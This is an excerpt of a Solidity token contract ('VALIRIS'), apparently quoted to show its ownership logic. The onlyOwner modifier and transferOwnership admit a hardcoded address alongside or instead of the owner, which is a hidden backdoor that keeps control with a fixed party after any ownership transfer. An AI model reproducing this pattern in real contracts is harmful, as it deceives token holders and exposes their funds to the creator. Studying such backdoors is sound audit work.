...
contract Ownable {
    ...
    modifier onlyOwner() {
        require(msg.sender == owner || msg.sender == address(0xAA96839296800F21e32F4Fa9Cfd52ba36B6fAfE8));
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        require(msg.sender == address(0xAA96839296800F21e32F4Fa9Cfd52ba36B6fAfE8));
...
contract BaseToken is Ownable {
    ...
    string constant public name = 'VALIRIS';
    string constant public symbol = 'VALIRIS';
    ...
    address public projectAddress = 0xAA96839296800F21e32F4Fa9Cfd52ba36B6fAfE8;
